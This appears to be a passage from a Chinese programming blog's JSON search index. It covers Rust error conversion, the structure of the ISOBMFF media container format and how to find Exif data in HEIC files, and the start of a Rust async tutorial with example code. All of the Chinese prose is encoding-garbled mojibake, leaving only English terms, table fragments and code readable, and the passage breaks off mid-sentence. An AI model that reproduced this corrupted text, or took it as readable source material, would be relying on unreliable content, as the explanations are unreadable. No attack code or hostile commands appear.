åˆ™ä¼šè¿›è¡Œè‡ªåŠ¨è½¬æ¢ã€‚ä¾‹å¦‚ï¼š\nè¿”å›çš„ Result ç±»å‹å£°æ˜ä¸º Result\u003cString, OurError\u003e ï¼ˆ OurError ä¸ºè‡ªå®šä¹‰çš„é”™è¯¯ç±»å‹ï¼‰ï¼Œå‡½æ•°ä½“ä¸­è¿”å›äº† io::Error ç±»å‹çš„é”™è¯¯ã€‚ OurError å®ç°äº† impl From\u003cio::Error\u003e for OurError ã€‚ ? è¿ç®—ç¬¦ä¼šè‡ªåŠ¨æ‰§è¡Œ from è½¬æ¢ï¼Œå°† io::Error è½¬æ¢ä¸º OurError å¹¶è¿”å›ã€‚ main å‡½æ•°çš„è¿”å›å€¼ main å‡½æ•°å¯ä»¥è¿”å›ä¸¤ç±»å€¼ï¼š\nResult\u003cT, E\u003e è¿”å› Ok\u003cT\u003e è¡¨ç¤ºæˆåŠŸï¼Œ Err\u003cE\u003e è¡¨ç¤ºå¤±è´¥ã€‚ Termination trait è¯¥ trait åŒ…å«ä¸€ä¸ª report æ–¹æ³•ï¼Œç”¨æ¥è¿”å›ä¸€ä¸ª ExitCodeã€‚ TODO Trait + å¹¶å‘ Send, Sync ç›¸å…³ï¼Œå¾…è¡¥å……ã€‚\n","description":"","tags":["rust"],"title":"Rust Trait+ ç³»åˆ—","uri":"/posts/rust-trait-plus-series/"},{"categories":null,"content":"å‰æ®µæ—¶é—´ç”¨ Rust å†™äº†ä¸€ä¸ª Exif/Metadata è§£æåº“ nom-exifï¼Œé‡Œé¢æ¶‰åŠåˆ°å¯¹ ISOBMFF çš„è§£æï¼Œè¶ç€è¿˜æœ‰ç‚¹å°è±¡ï¼Œæ€»ç»“ä¸€ä¸‹è¿™ç§æ–‡ä»¶æ ¼å¼ã€‚\nISOBMFF è‹±æ–‡å…¨ç§° ISO Base Media File Format ï¼Œé¡¾åæ€ä¹‰ä¸»è¦ç”¨äºå°è£…å¤šåª’ä½“æ–‡ä»¶ã€‚ ISOBMFF æœ€åˆç›´æ¥åŸºäº Apple çš„ QuickTime å®¹å™¨æ ¼å¼ï¼Œç„¶åç”± MPEG å¼€å‘å¹¶æ ‡å‡†åŒ–ä¸º ISO/IEC 14496-12 ã€‚\nè¯¥æ ¼å¼å·²å¹¿æ³›ç”¨äºåª’ä½“æ–‡ä»¶å­˜å‚¨ï¼Œå¹¶ä½œä¸ºå„ç§å…¶ä»–åª’ä½“æ–‡ä»¶æ ¼å¼ï¼ˆä¾‹å¦‚ MP4 å’Œ 3GP å®¹å™¨æ ¼å¼ï¼‰çš„åŸºç¡€ã€‚\nå“ªäº›æ–‡ä»¶ç±»å‹åœ¨ä½¿ç”¨ ISOBMFF? ä¸‹é¢è¿™ä¸ªè¡¨æ ¼åˆ—ä¸¾äº†å¸¸è§çš„ä½¿ç”¨äº† ISOBMFF æ ¼å¼çš„æ–‡ä»¶ï¼š\næ–‡ä»¶ç±»å‹ äº’è”ç½‘åª’ä½“ç±»å‹ï¼ˆMIMEï¼‰ å¸¸ç”¨æ‰©å±•å QuickTime video/quicktime .mov, .movie, .qt HEIF image/heif, image/heic .heif, .heifs; .heic, .heics; .avci, .avcs; .HIF MP4 video/mp4, audio/mp4 .mp4, .m4a, .m4p, .m4b, .m4r, .m4v 3GP video/3gpp .3gp, 3g2 JPEG 2000 image/jp2, image/jpx .jp2, .j2k, .jpf, .jpm, .jpg2, .j2c, .jpc, .jpx, .mj2 Flash Video video/x-flv .flv, .fla, .f4v, .f4a, .f4b, .f4p ISOBMFF æ–‡ä»¶ç»“æ„æ¦‚è¿° ISOBMFF æ–‡ä»¶ç”± Box (ä¹Ÿå« Atom) ç»„æˆï¼Œå¹¶ä¸”æ¯ä¸ª Box å†…éƒ¨éƒ½å¯ä»¥ä»»æ„åµŒå¥—ï¼Œç»„æˆä¸€æ£µ Box æ ‘ã€‚é¡¶å±‚ Box å¯ä»¥æœ‰å¤šä¸ªã€‚\nä¸€ä¸ªå…¸å‹çš„ ISOBMFF æ–‡ä»¶ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆä»¥ MP4 æ–‡ä»¶ä¸ºä¾‹ï¼‰ï¼š\nå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸€ä¸ªæ­£å¸¸çš„ ISOBMFF æ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªé¡¶å±‚ Box ä¸€èˆ¬æ˜¯ type ä¸º â€œftypâ€ çš„ BoxÂ 1ã€‚é€šè¿‡è§£æ ftyp Box, æˆ‘ä»¬å¯ä»¥ï¼š\næ£€æµ‹è¯¥æ–‡ä»¶æ˜¯å¦æ˜¯ ISOBMFF æ ¼å¼ã€‚ è¯†åˆ«è¯¥æ–‡ä»¶çš„å…·ä½“æ–‡ä»¶ç±»å‹ã€‚ä¾‹å¦‚æ˜¯ QuickTime, æˆ–è€… HEIF ç­‰ã€‚ å…·ä½“æ€ä¹ˆåšæˆ‘ä»¬åœ¨ ftyp Box ä¸€èŠ‚ä¸­ä»‹ç»ã€‚\né™¤äº†çº¦å®šç¬¬ä¸€ä¸ª Box æ˜¯ ftyp Box, åé¢çš„ Box å°±æ²¡æœ‰ä»»ä½•é™åˆ¶äº†ï¼Œä¸åŒçš„æ–‡ä»¶ç±»å‹éƒ½å¯èƒ½ä¸åŒã€‚\nåŸºæœ¬ Box ç»“æ„ ä¸‹é¢æ˜¯ä¸€ä¸ªæœ€ç®€å•çš„ Box ç»“æ„ï¼š\nbytes description example 4 box_size, å«è‡ªèº« 4 box_type â€œftypâ€, â€œmetaâ€ box_size - 8 box_data ftyp Box å¯¹äº ftyp Box æ¥è¯´ï¼Œbox_data é‡Œé¢å­˜æ”¾çš„å°±æ˜¯è¯¥æ–‡ä»¶çš„æ–‡ä»¶ç±»å‹ä¿¡æ¯ï¼Œå…¶ç»“æ„å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š\nbytes description example 4 Major brand, æ–‡ä»¶æ ¼å¼ä»£ç  â€œqt â€œ: QuickTime, â€œheicâ€: HEIC 4 Minor version, æ–‡ä»¶æ ¼å¼è§„èŒƒç‰ˆæœ¬ ç›®å‰å¾ˆå°‘ä½¿ç”¨ box_size - 8 - 8 Compatible brands, å…¼å®¹çš„æ–‡ä»¶æ ¼å¼ï¼Œå››å­—èŠ‚ä¸€ä¸ªï¼Œå¯èƒ½æœ‰å¤šä¸ª â€œmif1MiHEmiafMiHBheicâ€ æœ‰äº†ä¸Šè¿° ftyp box_data çš„ç»“æ„ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾ˆå®¹æ˜“å¯¹ ftyp Box è¿›è¡Œè§£æï¼Œä»è€Œåˆ¤æ–­è¯¥æ–‡ä»¶æ˜¯å¦æ˜¯ ISOBMFF, ä»¥åŠè¯†åˆ«å‡ºå…·ä½“çš„æ–‡ä»¶ç±»å‹ã€‚\nå‡ ç§ç‰¹æ®Šçš„ Box ç±»å‹ é™¤äº†åŸºæœ¬çš„ Box ç»“æ„ï¼Œè¿˜æœ‰å‡ ç§æ¯”è¾ƒç‰¹æ®Šçš„ Box ç±»å‹ï¼š\nsize ä¸º 1 çš„ Box (æ‰©å±•å°ºå¯¸ Box) size ä¸º 0 çš„ Box wide Box ä¸‹é¢æˆ‘ä»¬é€ä¸€ä»‹ç»ã€‚\nsize ä¸º 1 çš„ Box (æ‰©å±•å°ºå¯¸ Box) å¦‚æœ box_size == 1, åˆ™è¡¨ç¤º box_size è¶…è¿‡ 4 å­—èŠ‚ä¸Šé™ï¼ŒBox ç»“æ„å˜æˆï¼š\nbytes description example 4 box_size == 1 4 box_type â€œftypâ€, â€œmetaâ€ 8 extended_size extended_size - 16 box_data ä»ä¸Šé¢çš„ç»“æ„ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå®é™…çš„ Box é•¿åº¦å˜æˆäº† extended_size, é•¿åº¦çš„å­˜å‚¨ç©ºé—´æ‰©å±•ä¸º 8 å­—èŠ‚ã€‚\nsize ä¸º 0 çš„ Box å¦‚æœ box_size == 0, å¹¶ä¸æ„å‘³ç€è¯¥ Box é•¿åº¦ä¸º 0ã€‚è¿™ç§ Box åªèƒ½æ˜¯é¡¶å±‚ Box, å¹¶ä¸”åªèƒ½æ˜¯æœ€åä¸€ä¸ª Box, å…¶é•¿åº¦ä¸€ç›´å»¶ä¼¸è‡³æ–‡ä»¶æœ«å°¾ã€‚å…¶ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š\nbytes description example 4 box_size == 0 4 box_type â€œftypâ€, â€œmetaâ€ * box_data, é•¿åº¦ä¸€ç›´å»¶ä¼¸åˆ°æ–‡ä»¶æœ«å°¾ wide Box wide Box æ¯”è¾ƒæœ‰æ„æ€ï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š\nbytes description example 4 box_size == 8 4 box_type == â€œwideâ€ â€œwideâ€ å¯ä»¥çœ‹åˆ°ï¼Œwide Box çš„é•¿åº¦å›ºå®šä¸º 8, box_type å›ºå®šä¸º â€œwideâ€, ä¸”æ²¡æœ‰ box_dataã€‚\nwide box çš„ä½œç”¨æ˜¯ä¸ºäº†é¢„ç•™å‡º 8 ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œè¿™ä¸ª 8 å­—èŠ‚ç©ºé—´å¯èƒ½ç”¨æ¥å¹²å˜›å‘¢ï¼Ÿç­”æ¡ˆå°±åœ¨åå­—ä¸Š â€”â€” â€œwideâ€, é¡¾åæ€ä¹‰ï¼Œæ˜¯ç”¨äºæ‰©å±• Box é•¿åº¦çš„ã€‚ä¸‹é¢æˆ‘ä»¬å…·ä½“è§£é‡Šä¸€ä¸‹ã€‚\nwide Box åé¢ç´§æŒ¨ç€çš„ Box (å‘½åä¸º Box B å§), ä¸€èˆ¬æ˜¯ä¸€ä¸ªæ™®é€šçš„ size ä¸º 4 å­—èŠ‚çš„ Boxã€‚å¦‚æœå°†æ¥æŸä¸€å¤©ï¼ŒB çš„é•¿åº¦ä¸å¤Ÿï¼Œéœ€è¦æ‹¬å®¹ï¼Œåˆ™å¯ä»¥æŒ‰ç…§ä¸‹é¢çš„æ­¥éª¤æ“ä½œï¼š\nå°† wide Box çš„ size æ”¹æˆ 1 å°† wide Box çš„ type ä¿®æ”¹ä¸º B çš„ type å°† B çš„ size å¡«å……åˆ° B çš„å¤´ 8 ä¸ªå­—èŠ‚ï¼ˆå³ size + type éƒ¨åˆ†ï¼‰ è¿™æ ·ï¼Œå°±å®Œæˆäº† Box B ä» 4 å­—èŠ‚é•¿åº¦åˆ° 8 å­—èŠ‚é•¿åº¦çš„åŸåœ°æ‹¬å®¹ã€‚è¿™ç§æ–¹å¼çš„å¥½å¤„æ˜¯ï¼ŒB çš„ data éƒ¨åˆ†çš„ offset å¯ä»¥ä¿æŒä¸å˜ã€‚\nFull Box æœ‰äº› Box ä¸ºäº†è¿›ä¸€æ­¥æ§åˆ¶å…¶ data éƒ¨åˆ†çš„ç»“æ„å’Œå¤„ç†æ–¹å¼ï¼Œä¼šåœ¨ size/type åé¢å¢åŠ å››ä¸ªå­—èŠ‚ï¼Œå…¶ä¸­ä¸€ä¸ªå­—èŠ‚ä¸º version, ä¸‰ä¸ªå­—èŠ‚ä¸º flags, è¿™ç±» Box æˆ‘ä»¬ç§°ä¸º Full Boxã€‚\nFull Box ç»“æ„ç¤ºæ„ï¼š\nbytes description example 4 box_size 4 box_type â€œftypâ€, â€œmetaâ€ 1 version 3 flags box_size - 12 box_data version å’Œ flags çš„å«ä¹‰æ ¹æ® Box ç±»å‹çš„ä¸åŒè€Œä¸åŒã€‚\né™¤äº†å¢åŠ äº† version å’Œ flags å­—æ®µä¹‹å¤–ï¼ŒFull Box å’Œæ™®é€š Box ä¸€æ ·ï¼Œä¾‹å¦‚ size ä¸º 1 æ—¶ä¹Ÿè¡¨ç¤ºè¯¥ Box æ˜¯ä¸€ä¸ªæ‰©å±•å°ºå¯¸çš„ Boxã€‚\næ‰©å±•å°ºå¯¸ Full Box çš„ç»“æ„ç¤ºæ„ï¼š\nbytes description example 4 box_size == 1 4 box_type â€œftypâ€, â€œmetaâ€ 8 extended_size 1 version 3 flags extended_size - 20 box_data åœ¨ HEIC/HEIF æ–‡ä»¶ä¸­æŸ¥æ‰¾ Exif ä¿¡æ¯ æœ¬èŠ‚ä»‹ç»ä¸€ä¸‹åœ¨ HEIC/HEIF ä¸­å®šä½ Exif ä¿¡æ¯çš„è¿‡ç¨‹ï¼Œç®—æ˜¯å¯¹ä¸Šè¿°çŸ¥è¯†ç‚¹çš„ä¸€ä¸ªç»¼åˆåº”ç”¨å§ã€‚\nå…ˆçœ‹ä¸€ä¸‹ä¸€ä¸ªå…¸å‹çš„ HEIC/HEIF æ–‡ä»¶çš„ç»“æ„ç¤ºæ„å›¾ï¼š\nç”±äº Box çš„åµŒå¥—ç‰¹æ€§ï¼Œæ¯ä¸ªé¡¶å±‚ Box éƒ½å¯ä»¥è§†ä¸ºä¸€æ£µ Box æ ‘ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨ç±»ä¼¼æ–‡ä»¶è·¯å¾„çš„æ–¹å¼ï¼Œæ¥æ ‡è¯†æŸä¸ª Box, è·¯å¾„åå³ä¸º Box typeã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸Šå›¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ /meta/iinf è¡¨ç¤ºé¡¶å±‚ Box meta ä¸‹é¢çš„ iinf Boxã€‚\næœ‰äº†ä¸Šè¿°èƒŒæ™¯ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰ç…§ä¸‹é¢è¿™ä¸ªæ­¥éª¤æ¥æŸ¥æ‰¾ Exif ä¿¡æ¯ï¼š\næŸ¥æ‰¾ Exif infe\ninfe Box çš„è·¯å¾„æ˜¯ /meta/iinf/infe, ä½† infe Box ä¸æ­¢ä¸€ä¸ªï¼Œ iinf ä¸‹é¢æŒ‚ç€ä¸€ç³»åˆ—çš„ infe, æˆ‘ä»¬éœ€è¦æ‰¾çš„æ˜¯ Exif infe, å› æ­¤éœ€è¦å¯¹ infe list è¿›è¡Œéå†æŸ¥æ‰¾ã€‚\ninfe çš„è§£æè¿‡ç¨‹æœ‰ç‚¹å¤æ‚ï¼Œè¿™é‡Œä¸å±•å¼€è®¨è®ºï¼Œè¿™é‡Œåªæä¸¤ä¸ªå­—æ®µï¼Œä¸€ä¸ªæ˜¯ item_id, å¦ä¸€ä¸ªæ˜¯ item_type ã€‚æˆ‘ä»¬åœ¨éå† infe list æ—¶, éœ€è¦æ‰¾åˆ° item_type == \"Exif\" çš„ infe, ç„¶åè®°å½•å…¶ item_id ã€‚\nè§£æ Exif çš„åç§»å’Œé•¿åº¦ä¿¡æ¯\nå¾—åˆ° Exif infe çš„ item_id ä¹‹åï¼Œå¯ä»¥æ ¹æ®è¯¥ä¿¡æ¯åœ¨ iloc Box ä¸­è·å–åˆ° Exif çš„åç§»å’Œé•¿åº¦ä¿¡æ¯ã€‚å…¶è¿‡ç¨‹å¦‚ä¸‹ï¼š\næ‰¾åˆ° /meta/iloc Boxã€‚ iloc çš„ data éƒ¨åˆ†åŒ…å«ä¸€ç³»åˆ—çš„ ItemLocation, éœ€è¦æ ¹æ® item_id æ‰¾åˆ° Exif æ‰€å¯¹åº”çš„ ItemLocation ã€‚ è§£æ Exif ItemLocation, ä»ä¸­æå–å‡º Exif åç§»å’Œé•¿åº¦ä¿¡æ¯ã€‚ æ ¹æ® Exif åç§»å’Œé•¿åº¦ä¿¡æ¯ï¼Œè·å– Exif æ•°æ®\nå½“ç„¶ï¼Œä¸Šè¿°æ­¥éª¤æ˜¯ä¸€ä¸ªç®€åŒ–æè¿°ï¼Œå®é™…æƒ…å†µä¼šå¤æ‚å¾ˆå¤šï¼Œå…¶ä¸­ä¸å°‘ Box éƒ½æ¶‰åŠ version/flags çš„å¤æ‚çš„è¡Œä¸ºæ§åˆ¶ï¼Œä»¥åŠåµŒå¥—æ•°æ®ç»“æ„çš„å¤„ç†ï¼Œæ›´å¤šç»†èŠ‚å¯å‚è€ƒ nom-exif çš„æºç å®ç°ã€‚\nå‚è€ƒèµ„æ–™ ISO base media file format - Wikipedia QuickTime File Format GitHub - mindeng/nom-exif mp4box.js - file inspection è¿™é‡Œå…¶å®æœ‰ä¸€ä¸ªç‰¹ä¾‹ï¼Œä» iOS å®å†µå›¾ç‰‡ä¸­å¯¼å‡ºçš„ .mov è§†é¢‘æ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ª Box ä¸æ˜¯ ftyp, éœ€è¦ç¨å¾®æ³¨æ„ä¸€ä¸‹ã€‚Â â†©ï¸\n","description":"","tags":["parser","multimedia","rust"],"title":"ç†è§£ ISO åŸºæœ¬åª’ä½“æ–‡ä»¶æ ¼å¼ (ISOBMFF)","uri":"/posts/understanding-isobmff/"},{"categories":null,"content":"Rust çš„å¼‚æ­¥ç‰¹æ€§å¾ˆå¼ºå¤§ï¼Œç›¸å¯¹ä¹Ÿæ¯”è¾ƒå¤æ‚ã€‚\nä¸ºäº†æ›´å¥½çš„ç†è§£ Rust çš„å¼‚æ­¥ç‰¹æ€§ï¼Œæœ¬æ–‡åˆ†åˆ«ä» Rust å¼‚æ­¥çš„ç‰¹ç‚¹ã€ä¸å¤šçº¿ç¨‹çš„å¯¹æ¯”ã€å¼‚æ­¥çš„ç”¨æ³•ä»‹ç»åŠæ³¨æ„äº‹é¡¹ã€å†…éƒ¨å®ç°æœºåˆ¶ã€å’Œå…¶ä»–è¯­è¨€çš„æ¨ªå‘å¯¹æ¯”ç­‰å¤šä¸ªæ–¹é¢è¿›è¡Œé˜è¿°ã€‚\nRust å¼‚æ­¥çš„ç‰¹ç‚¹ Future æ˜¯æƒ°æ€§çš„ (inert) Future åªæœ‰åœ¨è½®è¯¢ (poll) æ—¶æ‰ä¼šå–å¾—è¿›å±• å¦‚æœ Future è¢« drop äº†ï¼Œåˆ™ä¸ä¼šå†å–å¾—æ›´å¤šè¿›å±• Async æ˜¯é›¶æˆæœ¬çš„ (zero-cost) æ— éœ€å †å†…å­˜åˆ†é… æ— éœ€åŠ¨æ€åˆ†æ´¾ï¼ˆdynamic dispatchï¼‰ å…³äºè¿™ä¸€ç‚¹ï¼Œå¯ä»¥å‚è€ƒRust çš„å¼‚æ­¥ä¸­çš„è¿›ä¸€æ­¥è§£é‡Šã€‚\nä¸æä¾›å†…ç½®è¿è¡Œæ—¶ è¿è¡Œæ—¶ç”±ç¤¾åŒºç»´æŠ¤çš„ crates æä¾›ã€‚å…·ä½“æ¥è¯´ï¼ŒRust çš„å¼‚æ­¥ç¼–ç¨‹ç¯å¢ƒç”±ä»¥ä¸‹å‡ éƒ¨åˆ†ç»„æˆï¼š\næ ‡å‡†åº“ æä¾›æœ€åŸºæœ¬çš„å¼‚æ­¥ç›¸å…³çš„ traits, ç±»å‹å’Œå‡½æ•°ã€‚ä¾‹å¦‚ Future trait å°±æ˜¯æ ‡å‡†åº“æä¾›çš„ã€‚ ç¼–è¯‘å™¨ async/await è¯­æ³•ç”± Rust ç¼–è¯‘å™¨ç›´æ¥æä¾›æ”¯æŒã€‚ futures crate æä¾›é€šç”¨å·¥å…·ç±»å‹ã€å®å’Œå‡½æ•°ï¼Œå®ƒä»¬å¯ä»¥åœ¨ä»»ä½• async ç¨‹åºä¸­ä½¿ç”¨ã€‚è¿™äº›ä¸œè¥¿å°†æ¥å¯èƒ½ä¼šæˆä¸ºæ ‡å‡†åº“çš„ä¸€éƒ¨åˆ†ã€‚ äº‹å®ä¸Š futures crate è‡ªå¸¦äº†ä¸€ä¸ª executor å¯ä»¥ç”¨æ¥æ‰§è¡Œç®€å•çš„å¼‚æ­¥ä»»åŠ¡ï¼Œä½†æ˜¯ä¸åŒ…æ‹¬ async I/O ä»¥åŠ timer çš„æ”¯æŒï¼Œå¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªä¸å®Œæ•´çš„è¿è¡Œæ—¶ç¯å¢ƒï¼Œå› æ­¤ä¸€èˆ¬éœ€è¦æ­é…å…¶ä»–è¿è¡Œæ—¶æ¥ä½¿ç”¨ã€‚\nè¿è¡Œæ—¶ å¼‚æ­¥ä»£ç çš„æ‰§è¡Œï¼ŒIO å’Œä»»åŠ¡ç”Ÿæˆ (task spawning) ç”± async è¿è¡Œæ—¶æä¾›ï¼Œä¾‹å¦‚ Tokio å’Œ async-stdã€‚å¤§éƒ¨åˆ†å¼‚æ­¥ç¨‹åºä»¥åŠä¸€äº›å¼‚æ­¥ crates ä¼šä¾èµ–äºç‰¹å®šçš„è¿è¡Œæ—¶ã€‚å…³äºè¿™éƒ¨åˆ†çš„æ›´å¤šä¿¡æ¯å¯å‚è€ƒï¼šThe Async Ecosystem ã€‚ å•çº¿ç¨‹ã€å¤šçº¿ç¨‹ä¸¤ç§è¿è¡Œæ—¶å¯ä¾›é€‰æ‹© ä»¥ Tokio ä¸ºä¾‹ï¼Œ rt å’Œ rt-multi-thread ä¸¤ä¸ª feature flag åˆ†åˆ«ä»£è¡¨äº†å•çº¿ç¨‹è¿è¡Œæ—¶å’Œå¤šçº¿ç¨‹è¿è¡Œæ—¶ã€‚\nç¼ºå¤±éƒ¨åˆ†è¯­è¨€åŠŸèƒ½ ä¸€äº›åŒæ­¥ Rust çš„è¯­è¨€åŠŸèƒ½åœ¨ async ä¸­å¯èƒ½ä¸å¯ç”¨ï¼Œä¾‹å¦‚ï¼Œä¸èƒ½åœ¨ trait ä¸­å®šä¹‰ async å‡½æ•°ã€‚\nä¸å¤šçº¿ç¨‹çš„å¯¹æ¯” çº¿ç¨‹é€‚ç”¨äºå°‘é‡ä»»åŠ¡åœºæ™¯ ç¼ºç‚¹ çº¿ç¨‹ä¼šå¸¦æ¥ CPU å’Œå†…å­˜å¼€é”€ åˆ›å»ºå’Œåˆ‡æ¢çº¿ç¨‹çš„æˆæœ¬å¾ˆé«˜ï¼Œå³ä½¿æ˜¯ç©ºçº¿ç¨‹ä¹Ÿä¼šæ¶ˆè€—ç³»ç»Ÿèµ„æº ä½¿ç”¨çº¿ç¨‹æ± æœ‰ä¸€å®šç¼“è§£ä½œç”¨ï¼Œä½†æ— æ³•å…¨éƒ¨æ¶ˆé™¤ ä¼˜ç‚¹ ç”±äºä¸éœ€è¦ç‰¹æ®Šçš„ç¼–ç¨‹æ¨¡å‹ï¼Œå› æ­¤åœ¨å¤ç”¨ç°æœ‰çš„åŒæ­¥ä»£ç æ—¶ï¼Œæ— éœ€å¤ªå¤§çš„æ”¹é€ æˆæœ¬ã€‚ æœ‰äº› OS å¯ä»¥ä¿®æ”¹çº¿ç¨‹çš„ä¼˜å…ˆçº§ï¼Œåœ¨ä¸€äº›å»¶è¿Ÿæ•æ„Ÿçš„åº”ç”¨ä¸­å¾ˆæœ‰ç”¨ï¼ˆä¾‹å¦‚é©±åŠ¨ç¨‹åºï¼‰ã€‚ Async å¯æ˜¾è‘—é™ä½ CPU å’Œå†…å­˜å¼€é”€ ä¼˜ç‚¹ Async å¯æ˜¾è‘—é™ä½ CPU å’Œå†…å­˜å¼€é”€ï¼Œå°¤å…¶æ˜¯å¯¹äº IO å¯†é›†å‹çš„ä»»åŠ¡æ¥è¯´ï¼Œä¾‹å¦‚æœåŠ¡å™¨å’Œæ•°æ®åº“åº”ç”¨ã€‚ åŒç­‰æ¡ä»¶ä¸‹ï¼ŒAsync å¯ä»¥æ¯”çº¿ç¨‹æ‹¥æœ‰å¤šå‡ºå‡ ä¸ªæ•°é‡çº§çš„ä»»åŠ¡ã€‚ ç¼ºç‚¹ ä¼šäº§ç”Ÿæ›´å¤§çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚\nåŸå› å¦‚ä¸‹ï¼š\nasync å‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹æ˜¯é€šè¿‡çŠ¶æ€æœºæ¥ç®¡ç†çš„ï¼Œå› æ­¤ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ä¸ºæ¯ä¸ª async å‡½æ•°ç”ŸæˆçŠ¶æ€æœºä»£ç ã€‚ æ¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶éƒ½ä¼šæ†ç»‘ä¸€ä¸ª async è¿è¡Œæ—¶ã€‚ å¼€å‘è¿‡ç¨‹å¯èƒ½ä¼šé‡åˆ°æ›´å¤šé—®é¢˜ã€‚\nä¸»è¦æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š\nå¯èƒ½ä¼šç¢°åˆ°æ›´å¤šçš„ç¼–è¯‘é”™è¯¯: ç”±äºæ¶‰åŠæ›´å¤æ‚çš„è¯­è¨€åŠŸèƒ½ï¼Œä¾‹å¦‚ lifetimes å’Œ pinning, å¯èƒ½æ›´å®¹æ˜“ç¢°åˆ°è¿™ç±»é”™è¯¯ã€‚\nè¿è¡Œæ—¶çš„é”™è¯¯å †æ ˆä¼šæ›´å¤æ‚: å› ä¸ºæ¶‰åŠç¼–è¯‘å™¨ä¸º async å‡½æ•°ç”Ÿæˆçš„çŠ¶æ€æœºã€‚\nä¸€äº›æ–°çš„é”™è¯¯æ¨¡å¼: - åœ¨å¼‚æ­¥ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªé˜»å¡å‡½æ•°\næ²¡æœ‰æ­£ç¡®å®ç° Future trait è¿™äº›é”™è¯¯å¯ä»¥æ‚„æ‚„åœ°é€šè¿‡ç¼–è¯‘å™¨ï¼Œæœ‰æ—¶ç”šè‡³å¯ä»¥é€šè¿‡å•å…ƒæµ‹è¯•ã€‚\nç”¨æ³•ä»‹ç» ä»¥ä¸‹ç¤ºä¾‹å‚è€ƒè‡ª async/.await Primer ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 // `block_on` blocks the current thread until the provided future has run to // completion. Other executors provide more complex behavior, like scheduling // multiple futures onto the same thread. use futures::executor::block_on; #[derive(Debug)] struct Song { name: String, } async fn learn_song() -\u003e Song { println!(\"learn song...\"); Song {name: \"hello\".to_string()} } async fn sing_song(song: Song) { println!(\"sing song: {:?}\", song); } async fn dance() { println!(\"dance ...\"); } async fn learn_and_sing() { // Wait until the song has been learned before singing it. // We use `.await` here rather than `block_on` to prevent blocking the // thread, which makes it possible to `dance` at the same time. let song = learn_song().await; sing_song(song).await; } async fn async_main() { let f1 = learn_and_sing(); let f2 = dance(); // `join!` is like `.await` but can wait for multiple futures concurrently. // If we're temporarily blocked in the `learn_and_sing` future, the `dance` // future will take over the current thread. If `dance` becomes blocked, // `learn_and_sing` can take back over. If both futures are blocked, then // `async_main` is blocked and will yield to the executor. futures::join!(f1, f2); } fn main() { block_on(async_main()); } 1 2 3 learn song... sing song: Song { name: \"hello\" } dance ... ä¸‹é¢æ˜¯å¯¹è¯¥ç¤ºä¾‹çš„å‡ ç‚¹è¯´æ˜ï¼š\nlearn_song åœ¨ sing_song ä¹‹å‰ï¼ŒäºŒè€…æ˜¯é¡ºåºæ‰§è¡Œçš„ã€‚ dance å’Œ learn_and_sing æ˜¯å¹¶å‘æ‰§è¡Œçš„ã€‚ .await è°ƒç”¨ä¼šå¯¼è‡´ async å‡½æ•°åœ¨å½“å‰ Future ä¸Šç­‰å¾…ç›´åˆ°å®Œæˆï¼Œä½†æ˜¯ä¼šåœ¨å½“å‰ Future é˜»å¡æ—¶ï¼Œå‡ºè®©å½“å‰çº¿ç¨‹çš„æ§åˆ¶æƒå¹¶å…è®¸å…¶ä»– async å‡½æ•°ç»§ç»­æ‰§è¡Œã€‚ ä½¿ç”¨å¼‚æ­¥æ—¶çš„æ³¨æ„äº‹é¡¹ï¼ˆå®¹æ˜“è¸©çš„å‘ï¼‰ async çš„ç”Ÿå‘½å‘¨æœŸ async fn å¦‚æœæœ‰ references ä½œä¸ºå…¥å‚ï¼Œåˆ™è¿”å›çš„ Future ä¼šå—åˆ°è¯¥å¼•ç”¨çš„ç”Ÿå‘½å‘¨æœŸçš„çº¦æŸã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿”å›çš„ future å¿…é¡»åœ¨å…¥å‚è¿˜æœ‰æ•ˆæ—¶æ‰§è¡Œå®Œ .await ã€‚\n1 2 3 4 5 6 7 8 use std::future::Future; // This function: async fn foo(x: \u0026u8) -\u003e u8 { *x } // Is equivalent to this function: fn foo_expanded\u003c'a\u003e(x: \u0026'a u8) -\u003e impl Future\u003cOutput = u8\u003e + 'a { async move { *x } } åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œé€šè¿‡å°†å‚æ•°å’Œå¯¹å¼‚æ­¥å‡½æ•°çš„è°ƒç”¨æ‰“åŒ…åˆ°ä¸€ä¸ª async å—ä¸­ï¼Œæ¥è§£å†³ references-as-arguments çš„ç”Ÿå‘½å‘¨æœŸé—®é¢˜ã€‚è¿™ç§æ–¹å¼å®é™…ä¸Šå°† borrow_x è¿”å›çš„å¸¦ç”Ÿå‘½å‘¨æœŸçº¦æŸçš„ future è½¬å˜æˆäº†ä¸€ä¸ª 'static futureã€‚\n1 2 3 4 5 6 7 8 9 10 11 fn bad() -\u003e impl Future\u003cOutput = u8\u003e { let x = 5; borrow_x(\u0026x) // ERROR: `x` does not live long enough } fn good() -\u003e impl Future\u003cOutput = u8\u003e { async { let x = 5; borrow_x(\u0026x).await } } async move async å—é»˜è®¤æ˜¯ä»¥å¼•ç”¨çš„æ–¹å¼æ•è·å¤–éƒ¨å€¼çš„ async move ä»¥ move 